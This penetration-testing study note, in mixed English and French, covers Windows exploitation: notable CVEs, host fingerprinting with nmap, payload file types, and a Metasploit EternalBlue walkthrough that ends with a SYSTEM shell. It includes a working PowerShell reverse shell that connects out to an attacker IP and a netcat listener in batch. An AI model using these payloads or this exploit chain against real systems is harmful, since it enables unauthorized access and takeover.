# Infiltrating Windows

***

For example, just in the last five years, there have been `3688` reported vulnerabilities just within Microsoft Products, and this number grows daily. This table was derived from [HERE](https://www.cvedetails.com/vendor/26/Microsoft.html)

***

<mark style="color:green;">**Windows Vulnerability Table**</mark>

![image](https://academy.hackthebox.com/storage/modules/115/window-vulns-table.png)

### <mark style="color:red;">Prominent Windows Exploits</mark>

<table data-header-hidden data-full-width="true"><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>Vulnerability</strong></td><td><strong>Description</strong></td></tr><tr><td><code>MS08-067</code></td><td>MS08-067 was a critical patch pushed out to many different Windows revisions due to an SMB flaw. This flaw made it extremely easy to infiltrate a Windows host. It was so efficient that the Conficker worm was using it to infect every vulnerable host it came across. Even Stuxnet took advantage of this vulnerability.</td></tr><tr><td><code>Eternal Blue</code></td><td>MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA. This exploit was most notably used in the WannaCry ransomware and NotPetya cyber attacks. This attack took advantage of a flaw in the SMB v1 protocol allowing for code execution. EternalBlue is believed to have infected upwards of 200,000 hosts just in 2017 and is still a common way to find access into a vulnerable Windows host.</td></tr><tr><td><code>PrintNightmare</code></td><td>A remote code execution vulnerability in the Windows Print Spooler. With valid credentials for that host or a low privilege shell, you can install a printer, add a driver that runs for you, and grants you system-level access to the host. This vulnerability has been ravaging companies through 2021. 0xdf wrote an awesome post on it <a href="https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html">here</a>.</td></tr><tr><td><code>BlueKeep</code></td><td>CVE 2019-0708 is a vulnerability in Microsoft's RDP protocol that allows for Remote Code Execution. This vulnerability took advantage of a miss-called channel to gain code execution, affecting every Windows revision from Windows 2000 to Server 2008 R2.</td></tr><tr><td><code>Sigred</code></td><td>CVE 2020-1350 utilized a flaw in how DNS reads SIG resource records. It is a bit more complicated than the other exploits on this list, but if done correctly, it will give the attacker Domain Admin privileges since it will affect the domain's DNS server which is commonly the primary Domain Controller.</td></tr><tr><td><code>SeriousSam</code></td><td>CVE 2021-36924 exploits an issue with the way Windows handles permission on the <code>C:\Windows\system32\config</code> folder. Before fixing the issue, non-elevated users have access to the SAM database, among other files. This is not a huge issue since the files can't be accessed while in use by the pc, but this gets dangerous when looking at volume shadow copy backups. These same privilege mistakes exist on the backup files as well, allowing an attacker to read the SAM database, dumping credentials.</td></tr><tr><td><code>Zerologon</code></td><td>CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoft’s Active Directory Netlogon Remote Protocol (MS-NRPC). It allows users to log on to servers using NT LAN Manager (NTLM) and even send account changes via the protocol. The attack can be a bit complex, but it is trivial to execute since an attacker would have to make around 256 guesses at a computer account password before finding what they need. This can happen in a matter of a few seconds.</td></tr></tbody></table>

***

### <mark style="color:red;">Enumerating Windows & Fingerprinting Methods</mark>

{% hint style="warning" %}
Since we have a set of targets, `what are a few ways to determine if the host is likely a Windows Machine`? To answer this question, we can look at a few things. The first one being the `Time To Live` (TTL) counter when utilizing ICMP to determine if the host is up. **A typical response from a Windows host will either be 32 or 128**. A response of or around 128 is the most common response you will see. This value may not always be exact, especially if you are not in the same layer three network as the target. We can utilize this value since most hosts will never be more than 20 hops away from your point of origin, so there is little chance of the TTL counter dropping into the acceptable values of another OS type. In the ping output `below`, we can see an example of this. For the example, we pinged a Windows 10 host and can see we have received replies with a TTL of 128. Check out&#x20;

* This [link](https://subinsb.com/default-device-ttl-values/) for a nice table showing other TTL values by OS.
{% endhint %}

<mark style="color:green;">**Pinged Host**</mark>

```bash
mrroboteLiot@htb[/htb]$ ping 192.168.86.39 

PING 192.168.86.39 (192.168.86.39): 56 data bytes
64 bytes from 192.168.86.39: icmp_seq=0 ttl=128 time=102.920 ms
```

<mark style="color:green;">**OS Detection Scan**</mark>

```bash
mrroboteLiot@htb[/htb]$ sudo nmap -v -O 192.168.86.39

Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 17:40 EDT
Initiating ARP Ping Scan at 17:40
Scanning 192.168.86.39 [1 port]
Completed ARP Ping Scan at 17:40, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:40
Completed Parallel DNS resolution of 1 host. at 17:40, 0.02s elapsed
Initiating SYN Stealth Scan at 17:40
Scanning desktop-jba7h4t.lan (192.168.86.39) [1000 ports]
Discovered open port 139/tcp on 192.168.86.39
Discovered open port 135/tcp on 192.168.86.39
Discovered open port 443/tcp on 192.168.86.39
Discovered open port 445/tcp on 192.168.86.39
Discovered open port 902/tcp on 192.168.86.39
Discovered open port 912/tcp on 192.168.86.39
Completed SYN Stealth Scan at 17:40, 1.54s elapsed (1000 total ports)
Initiating OS detection (try #1) against desktop-jba7h4t.lan (192.168.86.39)
Nmap scan report for desktop-jba7h4t.lan (192.168.86.39)
Host is up (0.010s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
902/tcp open  iss-realsecure
912/tcp open  apex-mesh
MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909
Network Distance: 1 hop
```

<mark style="color:green;">**Banner Grab to Enumerate Ports**</mark>

```bash
mrroboteLiot@htb[/htb]$ sudo nmap -v 192.168.86.39 --script banner.nse

Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 18:01 EDT
NSE: Loaded 1 scripts for scanning.
<snip>
Discovered open port 135/tcp on 192.168.86.39
Discovered open port 139/tcp on 192.168.86.39
Discovered open port 445/tcp on 192.168.86.39
Discovered open port 443/tcp on 192.168.86.39
Discovered open port 912/tcp on 192.168.86.39
Discovered open port 902/tcp on 192.168.86.39
Completed SYN Stealth Scan at 18:01, 1.46s elapsed (1000 total ports)
NSE: Script scanning 192.168.86.39.
Initiating NSE at 18:01
Completed NSE at 18:01, 20.11s elapsed
Nmap scan report for desktop-jba7h4t.lan (192.168.86.39)
Host is up (0.012s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
902/tcp open  iss-realsecure
| banner: 220 VMware Authentication Daemon Version 1.10: SSL Required, Se
|_rverDaemonProtocol:SOAP, MKSDisplayProtocol:VNC , , NFCSSL supported/t
912/tcp open  apex-mesh
| banner: 220 VMware Authentication Daemon Version 1.0, ServerDaemonProto
|_col:SOAP, MKSDisplayProtocol:VNC , ,
MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)
```

***

### <mark style="color:red;">Bats, DLLs, & MSI Files, Oh My!</mark>

When it comes to creating payloads for Windows hosts, we have plenty of options to choose from. DLLs, batch files, MSI packages, and even PowerShell scripts are some of the most common methods to use. Each file type can accomplish different things for us, but what they all have in common is that they are executable on a host. Try to keep your delivery mechanism for the payload in mind, as this can determine what type of payload you use.

<mark style="color:green;">**Payload Types to Consider**</mark>

<mark style="color:orange;">**DLLs (Dynamic Link Libraries)**</mark>

Une bibliothèque de liaison dynamique (DLL) est un fichier de bibliothèque utilisé dans les systèmes d'exploitation Microsoft pour fournir du code et des données partagés qui peuvent être utilisés par plusieurs programmes simultanément. Ces fichiers sont modulaires, ce qui permet d'avoir des applications plus dynamiques et plus faciles à mettre à jour.

Exemple : Lorsqu'un pentester injecte une DLL malveillante dans un processus existant, il peut potentiellement élever ses privilèges au niveau SYSTEM ou contourner les contrôles de compte utilisateur. Par exemple, en utilisant un outil comme DLL Injector, un attaquant peut introduire une DLL malveillante dans un processus légitime :

```c
// Exemple de code C pour charger une DLL
#include <Windows.h>
int main() {
HMODULE hDll = LoadLibrary("malicious.dll"); // Charge la DLL malveillante
// ...
return 0;
}
```

<mark style="color:orange;">**Fichiers Batch**</mark>

Les fichiers batch sont des **scripts textuels** utilisés par les administrateurs système pour effectuer automatiquement **plusieurs tâches** via l’**interpréteur de commandes** (comme `cmd.exe` sous Windows).

Ils portent l’extension **`.bat`** et permettent de **lancer des commandes en série** de manière automatisée sur la machine hôte.

Les fichiers batch sont des scripts basés sur du texte utilisés par les administrateurs système pour effectuer plusieurs tâches via l'interpréteur de commandes. Ces fichiers se terminent par l'extension .bat et permettent d'exécuter des commandes de manière automatisée.

Exemple : Un fichier batch peut contenir les commandes suivantes pour ouvrir un port et renvoyer des informations :

```batch
@echo off
netstat -an > C:\temp\network_connections.txt // Enregistre les connexions réseau
start cmd.exe /c "nc -l -p 4444" // Écoute sur le port 4444
```

<mark style="color:orange;">**VBS (VBScript)**</mark>

VBScript est un langage de script léger basé sur Visual Basic de Microsoft. Il est utilisé comme langage de script côté client dans les serveurs web pour permettre des pages web dynamiques. Bien que VBS soit désuet et désactivé dans la plupart des navigateurs modernes, il est encore utilisé dans le contexte du phishing et d'autres attaques.

Exemple : Un script VBS peut exécuter une commande dans l'invite de commandes :

```vba
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /c echo Hello from VBS!"
```

<mark style="color:orange;">**Fichiers MSI**</mark>

Les fichiers .MSI servent de base de données d'installation pour l'installateur Windows. Lorsqu'une nouvelle application est installée, l'installateur cherche le fichier .msi pour comprendre tous les composants nécessaires.

Exemple : Pour créer un payload sous forme de fichier .msi, nous pourrions utiliser un outil comme WiX Toolset. Une fois le fichier .msi sur l'hôte, on peut l'exécuter :

```powershell
msiexec /i C:\path\to\payload.msi // Exécute le fichier .msi
```

<mark style="color:orange;">**PowerShell**</mark>

PowerShell est à la fois un environnement de shell et un langage de script. Il constitue l'environnement moderne de shell de Microsoft dans ses systèmes d'exploitation. C'est un langage dynamique basé sur le Common Language Runtime (.NET) qui traite l'entrée et la sortie comme des objets .NET.

Exemple : Un script PowerShell permettant d'établir une connexion inversée :

```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.1.100", 4444)
$stream = $client.GetStream()
[byte[]]$buffer = 0..65535 | % {0}
while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $i)
$sendback = (iex $data 2>&1 | Out-String)
$sendback2 = $sendback + "PS " + (pwd).Path + "> "
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
$stream.Write($sendbyte, 0, $sendbyte.Length)
$stream.Flush()
}
$client.Close()
```

***

### <mark style="color:red;">Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution</mark>

**Payload Generation**

<table data-header-hidden data-full-width="true"><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>Resource</strong></td><td><strong>Description</strong></td></tr><tr><td><code>MSFVenom &#x26; Metasploit-Framework</code></td><td><a href="https://github.com/rapid7/metasploit-framework">Source</a> MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife.</td></tr><tr><td><code>Payloads All The Things</code></td><td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">Source</a> Here, you can find many different resources and cheat sheets for payload generation and general methodology.</td></tr><tr><td><code>Mythic C2 Framework</code></td><td><a href="https://github.com/its-a-feature/Mythic">Source</a> The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.</td></tr><tr><td><code>Nishang</code></td><td><a href="https://github.com/samratashok/nishang">Source</a> Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.</td></tr><tr><td><code>Darkarmour</code></td><td><a href="https://github.com/bats3c/darkarmour">Source</a> Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.</td></tr></tbody></table>

{% hint style="warning" %}
<mark style="color:orange;">**Transfert et Exécution de Payloads**</mark>

Outre les vecteurs tels que les attaques de type "web drive-by", les emails de phishing ou les dépôts de fichiers, les hôtes Windows peuvent nous offrir plusieurs autres voies pour livrer un payload. La liste ci-dessous inclut quelques outils et protocoles utiles à utiliser lors de la tentative de déploiement d'un payload sur une cible.

**1. Impacket**

Impacket est une suite d'outils écrite en Python qui nous permet d'interagir directement avec les protocoles réseau. Certains des outils les plus intéressants d'Impacket concernent des fonctionnalités telles que **psexec**, **smbclient**, **WMI**, **Kerberos**, et la capacité de mettre en place un serveur SMB.

* **Explication :** Impacket est un outil très puissant qui facilite l'exécution de commandes à distance, le transfert de fichiers, et l'interaction avec divers protocoles réseau sur des machines Windows. Par exemple, l'utilisation de **psexec** permet d'exécuter des commandes sur une machine distante en utilisant des autorisations d'administrateur.

**2. Payloads All The Things**

Ce site est une excellente ressource pour trouver des exemples rapides de commandes pour aider à transférer des fichiers entre hôtes de manière efficace.

* **Explication :** Cette ressource compile une collection de scripts et de commandes qui peuvent être utilisés pour transférer des payloads rapidement et facilement. C'est particulièrement utile pour les pentesters qui cherchent à exécuter des actions spécifiques sans avoir à écrire un script complet.

**3. SMB (Server Message Block)**

SMB peut offrir une méthode facilement exploitable pour transférer des fichiers entre hôtes. Cela peut être particulièrement utile lorsque les hôtes victimes sont intégrés dans un domaine et utilisent des partages pour héberger des données. Nous, en tant qu'attaquants, pouvons utiliser ces partages de fichiers SMB ainsi que les partages C$ et admin$ pour héberger et transférer nos payloads et même exfiltrer des données via ces liens.

* **Explication :** SMB est un protocole de réseau qui permet le partage de fichiers et d'imprimantes sur des réseaux locaux. En tant qu'attaquant, exploiter SMB peut faciliter le transfert de fichiers, y compris des payloads malveillants, vers la machine cible. Les partages comme **C$** (le disque C de la machine) ou **admin$** (le partage administratif) offrent des accès potentiellement non sécurisés que les attaquants peuvent utiliser.

**4. Exécution à distance via MSF (Metasploit Framework)**

Intégré dans de nombreux modules d'exploitation de Metasploit, il existe une fonction qui construit, met en scène et exécute automatiquement les payloads.

* **Explication :** Metasploit est un framework largement utilisé pour le test de pénétration qui permet d'exploiter des failles de sécurité dans des systèmes. Sa fonctionnalité d'exécution à distance permet aux utilisateurs de déployer des payloads sans avoir à gérer manuellement chaque étape, ce qui simplifie considérablement le processus d'attaque.

**5. Autres Protocoles**

En examinant un hôte, des protocoles tels que **FTP**, **TFTP**, **HTTP/S**, et d'autres peuvent vous offrir une méthode pour uploader des fichiers sur l'hôte. Il est important d'énumérer et de prêter attention aux fonctions qui sont ouvertes et disponibles à l'utilisation.

* **Explication :** Divers protocoles de transfert de fichiers peuvent être exploités pour envoyer des payloads sur la machine cible. Par exemple, FTP est un protocole commun pour le transfert de fichiers qui pourrait être utilisé si un serveur FTP est accessible sur la cible. L'examen des services ouverts et des ports disponibles peut révéler des opportunités d'exploiter ces protocoles pour livrer des payloads malveillants.
{% endhint %}

***

### <mark style="color:red;">Example Compromise Walkthrough</mark>

1. <mark style="color:green;">**Enumerate The Host**</mark>

Ping, Netcat, Nmap scans, and even Metasploit are all good options to start enumerating our potential victims. To start this time, we will utilize an Nmap scan. The enumeration portion of any exploit chain is arguably the most critical piece of the puzzle. Understanding the target and what makes it tick will raise your chances of gaining a shell.

<mark style="color:orange;">**Enumerate the Host**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ nmap -v -A 10.129.201.97

```

It is running `Windows Server 2016 Standard 6.3`. We have the hostname now, and we know it is not in a domain and is running several services. Now that we have gathered some information let's determine our potential exploit path.\
`IIS` could be a potential path, attempting to access the host over SMB utilizing a tool like Impacket or authenticating if we had credentials could do it, and from an OS perspective, there may be a route for an RCE as well. MS17-010 (EternalBlue) has been known to affect hosts ranging from Windows 2008 to Server 2016. With this in mind, it could be a solid bet that our victim is vulnerable since it falls in that window. Let's validate that using a builtin auxiliary check from `Metasploit`, `auxiliary/scanner/smb/smb_ms17_010`.

2. <mark style="color:green;">**Search for and decide on an exploit path**</mark>

Open `msfconsole` and search for EternalBlue, or you can use the string in the session below to use the check. Set the RHOSTS field with the target's IP address and initiate the scan. As can be seen in the options for the module, you can fill in more of the SMB settings, but it is not necessary. They will help to make the check more likely to succeed. When ready, type `run`.

<mark style="color:orange;">**Determine an Exploit Path**</mark>

{% code fullWidth="true" %}
```shell-session
msf6 auxiliary(scanner/smb/smb_ms17_010) > use auxiliary/scanner/smb/smb_ms17_010 
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                 Required  Description
   ----         ---------------                 --------  -----------
   CHECK_ARCH   true                            no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                            no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                           no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framewor  yes       List of named pipes to check
                k/data/wordlists/named_pipes.t
                xt
   RHOSTS                                       yes       The target host(s), range CIDR identifier, or hosts f
                                                          ile with syntax 'file:<path>'
   RPORT        445                             yes       The SMB service port (TCP)
   SMBDomain    .                               no        The Windows domain to use for authentication
   SMBPass                                      no        The password for the specified username
   SMBUser                                      no        The username to authenticate as
   THREADS      1                               yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.129.201.97

RHOSTS => 10.129.201.97
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.129.201.97:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
[*] 10.129.201.97:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
{% endcode %}

Now, we can see from the check results that our target is likely vulnerable to EternalBlue. Let's set up the exploit and payload now, then give it a shot.

3. <mark style="color:green;">**Select Exploit & Payload, then Deliver**</mark>

<mark style="color:orange;">**Choose & Configure Our Exploit & Payload**</mark>

{% code fullWidth="true" %}
```shell-session
msf6 > search eternal

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   2  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    .........
```
{% endcode %}

For this instance, we dug through MSF's exploit modules utilizing the search function to look for an exploit matching EternalBlue. The list above was the result. Since I have had more luck with the `psexec` version of this exploit, we will try that one first. Let's choose it and continue the setup.

<mark style="color:orange;">**Configure The Exploit & Payload**</mark>

{% code fullWidth="true" %}
```shell-session
msf6 > use 2
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > options
```
{% endcode %}

**Validate Our Options**

{% code fullWidth="true" %}
```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > show options
```
{% endcode %}

This time, we kept it simple and just used a `windows/meterpreter/reverse_tcp` payload. You can change this as you wish for a different shell type or obfuscate your attack more, as shown in the previous payloads sections. With our options set, let's give this a try and see if we land a shell.

4. <mark style="color:green;">**Execute Attack, and Receive A Callback.**</mark>

<mark style="color:orange;">**Execute Our Attack**</mark>

{% code fullWidth="true" %}
```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```
{% endcode %}

5. <mark style="color:orange;">**Identify the Native Shell.**</mark>

**Identify Our Shell**

{% code fullWidth="true" %}
```shell-session
meterpreter > shell

Process 4844 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
{% endcode %}

When we executed the Meterpreter command `shell`, it started another process on the host and dropped us into a system shell. Can you determine what we are in from the prompt? Just seeing `C:\Windows\system32>` can clue us in that we are just in a `cmd.exe shell`. To make sure, simply running the command help from within the shell will also let you know. If we were dropped into PowerShell, our prompt would look like `PS C:\Windows\system32>`. The PS in front lets us know it is a PowerShell session. Congrats on dropping into a shell on our latest exploited Windows host.

***

### <mark style="color:red;">CMD-Prompt and Power\[Shell]s for Fun and Profit.</mark>

CMD shell is the original MS-DOS shell built into Windows. It was made for basic interaction and I.T. operations on a host. Some simple automation could be achieved with batch files, but that was all. Powershell came along with a purpose to expand the capabilities of cmd. PowerShell understands the native MS-DOS commands utilized in CMD and a whole new set of commands based in .NET. New self-sufficient modules can also be implemented into PowerShell with cmdlets. CMD prompt deals with text input and output while Powershell utilizes .NET objects for all input and output. Another important consideration is that CMD does not keep a record of the commands used during the session whereas, PowerShell does. So in the context of being stealthy, executing commands with cmd will leave less of a trace on the host. Other potential problems such as `Execution Policy` and `User Account Control (UAC)` can inhibit your ability to execute commands and scripts on the host. These considerations affect `PowerShell` but not cmd. Another big concern to take into account is the age of the host. If you land on a Windows XP or older host ( yes, it's still possible..) PowerShell is not present, so your only option will be cmd. PowerShell did not come to fruition until Windows 7. So to sum it all up:

Use `CMD` when:

* You are on an older host that may not include PowerShell.
* When you only require simple interactions/access to the host.
* When you plan to use simple batch files, net commands, or MS-DOS native tools.
* When you believe that execution policies may affect your ability to run scripts or other actions on the host.

Use `PowerShell` when:

* You are planning to utilize cmdlets or other custom-built scripts.
* When you wish to interact with .NET objects instead of text output.
* When being stealthy is of lesser concern.
* If you are planning to interact with cloud-based services and hosts.
* If your scripts set and use Aliases.

